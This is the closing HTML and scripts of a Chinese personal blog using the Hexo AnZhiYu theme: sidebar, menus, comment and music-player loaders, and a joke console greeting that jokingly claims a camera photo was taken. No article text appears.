class="headline">文章</div><div class="length-num">20</div></a><a href="/tags/" title="tag"><div class="headline">标签</div><div class="length-num">11</div></a><a href="/categories/" title="category"><div class="headline">分类</div><div class="length-num">3</div></a></div><span class="sidebar-menu-item-title">功能</span><div class="sidebar-menu-item"><a class="darkmode_switchbutton menu-child" href="javascript:void(0);" title="显示模式"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span>显示模式</span></a></div><div class="back-menu-list-groups"><div class="back-menu-list-group"><div class="back-menu-list-title">网页</div><div class="back-menu-list"><a class="back-menu-item" href="https://cszvvds.cc" title="博客"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/favicon.ico" alt="博客"/><span class="back-menu-item-text">博客</span></a></div></div><div class="back-menu-list-group"><div class="back-menu-list-title">项目</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://image.anheyu.com/" title="安知鱼图床"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://image.anheyu.com/favicon.ico" alt="安知鱼图床"/><span class="back-menu-item-text">安知鱼图床</span></a></div></div></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><i class="anzhiyufont anzhiyu-icon-box-archive faa-tada" style="font-size: 0.9em;"></i><span> 文章总览</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><i class="anzhiyufont anzhiyu-icon-shapes faa-tada" style="font-size: 0.9em;"></i><span> 全部分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags faa-tada" style="font-size: 0.9em;"></i><span> 全部标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/comments/"><i class="anzhiyufont anzhiyu-icon-envelope faa-tada" style="font-size: 0.9em;"></i><span> 留言面板</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><i class="anzhiyufont anzhiyu-icon-paper-plane faa-tada" style="font-size: 0.9em;"></i><span> 关于本人</span></a></li></ul></div></div><span class="sidebar-menu-item-title">标签</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/java/" style="font-size: 0.88rem;">java<sup>2</sup></a><a href="/tags/java%E5%AE%89%E5%85%A8/" style="font-size: 0.88rem;">java安全<sup>1</sup></a><a href="/tags/misc/" style="font-size: 0.88rem;">misc<sup>1</sup></a><a href="/tags/web/" style="font-size: 0.88rem;">web<sup>7</sup></a><a href="/tags/wp/" style="font-size: 0.88rem;">wp<sup>5</sup></a><a href="/tags/%E5%85%B6%E4%BB%96/" style="font-size: 0.88rem;">其他<sup>5</sup></a><a href="/tags/%E5%86%85%E7%BD%91/" style="font-size: 0.88rem;">内网<sup>1</sup></a><a href="/tags/%E5%90%8E%E7%AB%AF%E6%BC%8F%E6%B4%9E/" style="font-size: 0.88rem;">后端漏洞<sup>5</sup></a><a href="/tags/%E5%AD%A6%E4%B9%A0/" style="font-size: 0.88rem;">学习<sup>1</sup></a><a href="/tags/%E5%B7%A5%E5%85%B7/" style="font-size: 0.88rem;">工具<sup>2</sup></a><a href="/tags/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/" style="font-size: 0.88rem;">编程语言<sup>1</sup></a></div></div><hr/></div></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="anzhiyufont anzhiyu-icon-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="anzhiyufont anzhiyu-icon-gear"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="anzhiyufont anzhiyu-icon-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="anzhiyufont anzhiyu-icon-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="anzhiyufont anzhiyu-icon-xmark"></i></button></nav><div class="is-center" id="loading-database"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-pulse-icon"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div id="rightMenu"><div class="rightMenu-group rightMenu-small"><div class="rightMenu-item" id="menu-backward"><i class="anzhiyufont anzhiyu-icon-arrow-left"></i></div><div class="rightMenu-item" id="menu-forward"><i class="anzhiyufont anzhiyu-icon-arrow-right"></i></div><div class="rightMenu-item" id="menu-refresh"><i class="anzhiyufont anzhiyu-icon-arrow-rotate-right" style="font-size: 1rem;"></i></div><div class="rightMenu-item" id="menu-top"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></div></div><div class="rightMenu-group rightMenu-line rightMenuPlugin"><div class="rightMenu-item" id="menu-copytext"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制选中文本</span></div><div class="rightMenu-item" id="menu-pastetext"><i class="anzhiyufont anzhiyu-icon-paste"></i><span>粘贴文本</span></div><a class="rightMenu-item" id="menu-commenttext"><i class="anzhiyufont anzhiyu-icon-comment-medical"></i><span>引用到评论</span></a><div class="rightMenu-item" id="menu-newwindow"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开</span></div><div class="rightMenu-item" id="menu-copylink"><i class="anzhiyufont anzhiyu-icon-link"></i><span>复制链接地址</span></div><div class="rightMenu-item" id="menu-copyimg"><i class="anzhiyufont anzhiyu-icon-images"></i><span>复制此图片</span></div><div class="rightMenu-item" id="menu-downloadimg"><i class="anzhiyufont anzhiyu-icon-download"></i><span>下载此图片</span></div><div class="rightMenu-item" id="menu-newwindowimg"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开图片</span></div><div class="rightMenu-item" id="menu-search"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>站内搜索</span></div><div class="rightMenu-item" id="menu-searchBaidu"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>百度搜索</span></div><div class="rightMenu-item" id="menu-music-toggle"><i class="anzhiyufont anzhiyu-icon-play"></i><span>播放音乐</span></div><div class="rightMenu-item" id="menu-music-back"><i class="anzhiyufont anzhiyu-icon-backward"></i><span>切换到上一首</span></div><div class="rightMenu-item" id="menu-music-forward"><i class="anzhiyufont anzhiyu-icon-forward"></i><span>切换到下一首</span></div><div class="rightMenu-item" id="menu-music-playlist" onclick="window.open(&quot;https://y.qq.com/n/ryqq/playlist/8802438608&quot;, &quot;_blank&quot;);" style="display: none;"><i class="anzhiyufont anzhiyu-icon-radio"></i><span>查看所有歌曲</span></div><div class="rightMenu-item" id="menu-music-copyMusicName"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制歌名</span></div></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item menu-link" id="menu-randomPost"><i class="anzhiyufont anzhiyu-icon-shuffle"></i><span>随便逛逛</span></a><a class="rightMenu-item menu-link" href="/categories/"><i class="anzhiyufont anzhiyu-icon-cube"></i><span>博客分类</span></a><a class="rightMenu-item menu-link" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags"></i><span>文章标签</span></a></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item" id="menu-copy" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制地址</span></a><a class="rightMenu-item" id="menu-commentBarrage" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-message"></i><span class="menu-commentBarrage-text">关闭热评</span></a><a class="rightMenu-item" id="menu-darkmode" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span class="menu-darkmode-text">深色模式</span></a><a class="rightMenu-item" id="menu-translate" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-language"></i><span>轉為繁體</span></a></div></div><div id="rightmenu-mask"></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.cbd.int/@fancyapps/ui@5.0.28/dist/fancybox/fancybox.umd.js"></script><script src="https://cdn.cbd.int/instant.page@5.2.0/instantpage.js" type="module"></script><script src="https://cdn.cbd.int/vanilla-lazyload@17.8.5/dist/lazyload.iife.min.js"></script><script src="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.js"></script><canvas id="universe"></canvas><script async src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.0/dark/dark.js"></script><script>// 消除控制台打印
var HoldLog = console.log;
console.log = function () {};
let now1 = new Date();
queueMicrotask(() => {
  const Log = function () {
    HoldLog.apply(console, arguments);
  }; //在恢复前输出日志
  const grt = new Date("04/01/2021 00:00:00"); //此处修改你的建站时间或者网站上线时间
  now1.setTime(now1.getTime() + 250);
  const days = (now1 - grt) / 1000 / 60 / 60 / 24;
  const dnum = Math.floor(days);
  const ascll = [
    `欢迎使用安知鱼!`,
    `生活明朗, 万物可爱`,
    `
        
       █████╗ ███╗   ██╗███████╗██╗  ██╗██╗██╗   ██╗██╗   ██╗
      ██╔══██╗████╗  ██║╚══███╔╝██║  ██║██║╚██╗ ██╔╝██║   ██║
      ███████║██╔██╗ ██║  ███╔╝ ███████║██║ ╚████╔╝ ██║   ██║
      ██╔══██║██║╚██╗██║ ███╔╝  ██╔══██║██║  ╚██╔╝  ██║   ██║
      ██║  ██║██║ ╚████║███████╗██║  ██║██║   ██║   ╚██████╔╝
      ╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚═╝   ╚═╝    ╚═════╝
        
        `,
    "已上线",
    dnum,
    "天",
    "©2024 By 安知鱼 V1.6.12",
  ];
  const ascll2 = [`NCC2-036`, `调用前置摄像头拍照成功，识别为【小笨蛋】.`, `Photo captured: `, `🤪`];

  setTimeout(
    Log.bind(
      console,
      `\n%c${ascll[0]} %c ${ascll[1]} %c ${ascll[2]} %c${ascll[3]}%c ${ascll[4]}%c ${ascll[5]}\n\n%c ${ascll[6]}\n`,
      "color:#425AEF",
      "",
      "color:#425AEF",
      "color:#425AEF",
      "",
      "color:#425AEF",
      ""
    )
  );
  setTimeout(
    Log.bind(
      console,
      `%c ${ascll2[0]} %c ${ascll2[1]} %c \n${ascll2[2]} %c\n${ascll2[3]}\n`,
      "color:white; background-color:#4fd953",
      "",
      "",
      'background:url("https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/tinggge.gif") no-repeat;font-size:450%'
    )
  );

  setTimeout(Log.bind(console, "%c WELCOME %c 你好，小笨蛋.", "color:white; background-color:#4f90d9", ""));

  setTimeout(
    console.warn.bind(
      console,
      "%c ⚡ Powered by 安知鱼 %c 你正在访问 VVkladg0r 的博客.",
      "color:white; background-color:#f0ad4e",
      ""
    )
  );

  setTimeout(Log.bind(console, "%c W23-12 %c 你已打开控制台.", "color:white; background-color:#4f90d9", ""));

  setTimeout(
    console.warn.bind(console, "%c S013-782 %c 你现在正处于监控中.", "color:white; background-color:#d9534f", "")
  );
});</script><script async src="/anzhiyu/random.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"><script>(() => {
  const initWaline = () => {
    const waline = Waline.init(Object.assign({
      el: '#waline-wrap',
      serverURL: 'waline.cszvvds.cc',
      pageview: false,
      dark: 'html[data-theme="dark"]',
      path: window.location.pathname,
      comment: false,
    }, null))
  }

  const loadWaline = async () => {
    if (typeof Waline === 'object') initWaline()
    else {
      await getCSS('https://cdn.cbd.int/@waline/client@2.15.5/dist/waline.css')
      await getScript('https://cdn.cbd.int/@waline/client@2.15.5/dist/waline.js')
      initWaline()
    }
  }

  if ('Waline' === 'Waline' || !true) {
    if (true) anzhiyu.loadComment(document.getElementById('waline-wrap'),loadWaline)
    else setTimeout(loadWaline, 0)
  } else {
    window.loadOtherComment = loadWaline
  }
})()</script><input type="hidden" name="page-type" id="page-type" value="post"></div><script>window.addEventListener('load', () => {
  const changeContent = content => {
    if (content === '') return content

    content = content.replace(/<img.*?src="(.*?)"?[^\>]+>/ig, '[图片]') // replace image link
    content = content.replace(/<a[^>]+?href=["']?([^"']+)["']?[^>]*>([^<]+)<\/a>/gi, '[链接]') // replace url
    content = content.replace(/<pre><code>.*?<\/pre>/gi, '[代码]') // replace code
    content = content.replace(/<[^>]+>/g,"") // remove html tag

    if (content.length > 150) {
      content = content.substring(0,150) + '...'
    }
    return content
  }

  const generateHtml = array => {
    let result = ''

    if (array.length) {
      for (let i = 0; i < array.length; i++) {
        result += '<div class=\'aside-list-item\'>'

        if (true) {
          const name = 'data-lazy-src'
          result += `<a href='${array[i].url}' class='thumbnail'><img ${name}='${array[i].avatar}' alt='${array[i].nick}'></a>`
        }

        result += `<div class='content'>
        <a class='comment' href='${array[i].url}' title='${array[i].content}'>${array[i].content}</a>
        <div class='name'><span>${array[i].nick} / </span><time datetime="${array[i].date}">${anzhiyu.diffDate(array[i].date, true)}</time></div>
        </div></div>`
      }
    } else {
      result += '没有评论'
    }

    let $dom = document.querySelector('#card-newest-comments .aside-list')
    $dom && ($dom.innerHTML= result)
    window.lazyLoadInstance && window.lazyLoadInstance.update()
    window.pjax && window.pjax.refresh($dom)
  }

  const getComment = async () => {
    try {
      const res = await fetch('waline.cszvvds.cc/api/comment?type=recent&count=6', { method: 'GET' })
      const result = await res.json()
      const walineArray = result.data.map(e => {
        return {
          'content': changeContent(e.comment),
          'avatar': e.avatar,
          'nick': e.nick,
          'url': e.url + '#' + e.objectId,
          'date': e.time || e.insertedAt
        }
      })
      saveToLocal.set('waline-newest-comments', JSON.stringify(walineArray), 10/(60*24))
      generateHtml(walineArray)
    } catch (err) {
      console.error(err)
      const $dom = document.querySelector('#card-newest-comments .aside-list')
      $dom.textContent= "无法获取评论，请确认相关配置是否正确"
    }
  }

  const newestCommentInit = () => {
    if (document.querySelector('#card-newest-comments .aside-list')) {
      const data = saveToLocal.get('waline-newest-comments')
      if (data) {
        generateHtml(JSON.parse(data))
      } else {
        getComment()
      }
    }
  }

  newestCommentInit()
  document.addEventListener('pjax:complete', newestCommentInit)
})</script><script>var visitorMail = "";
</script><script async data-pjax src="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/waterfall/waterfall.js"></script><script src="https://lf3-cdn-tos.bytecdntp.com/cdn/expire-1-M/qrcodejs/1.0.0/qrcode.min.js"></script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.9/icon/ali_iconfont_css.css"><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/aplayer/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.cbd.int/anzhiyu-blog-static@1.0.1/js/APlayer.min.js"></script><script src="https://cdn.cbd.int/hexo-anzhiyu-music@1.0.1/assets/js/Meting2.min.js"></script><script src="https://cdn.cbd.int/pjax@0.2.8/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
var pjax = new Pjax({
  elements: 'a:not([target="_blank"])',
  selectors: pjaxSelectors,
  cacheBust: false,
  analytics: false,
  scrollRestoration: false
})

document.addEventListener('pjax:send', function () {
  // removeEventListener scroll 
  anzhiyu.removeGlobalFnEvent('pjax')
  anzhiyu.removeGlobalFnEvent('themeChange')

  document.getElementById('rightside').classList.remove('rightside-show')
  
  if (window.aplayers) {
    for (let i = 0; i < window.aplayers.length; i++) {
      if (!window.aplayers[i].options.fixed) {
        window.aplayers[i].destroy()
      }
    }
  }

  typeof typed === 'object' && typed.destroy()

  //reset readmode
  const $bodyClassList = document.body.classList
  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
})

document.addEventListener('pjax:complete', function () {
  window.refreshFn()

  document.querySelectorAll('script[data-pjax]').forEach(item => {
    const newScript = document.createElement('script')
    const content = item.text || item.textContent || item.innerHTML || ""
    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
    newScript.appendChild(document.createTextNode(content))
    item.parentNode.replaceChild(newScript, item)
  })

  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()

  typeof panguInit === 'function' && panguInit()

  // google analytics
  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});

  // baidu analytics
  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);

  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()

  // prismjs
  typeof Prism === 'object' && Prism.highlightAll()
})

document.addEventListener('pjax:error', e => {
  if (e.request.status === 404) {
    pjax.loadUrl('/404.html')
  }
})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script charset="UTF-8" src="https://cdn.cbd.int/anzhiyu-theme-static@1.1.5/accesskey/accesskey.js"></script></div><div id="popup-window"><div class="popup-window-title">通知</div><div class="popup-window-divider"></div><div class="popup-window-content"><div class="popup-tip">你好呀</div><div class="popup-link"><i class="anzhiyufont anzhiyu-icon-arrow-circle-right"></i></div></div></div></body></html>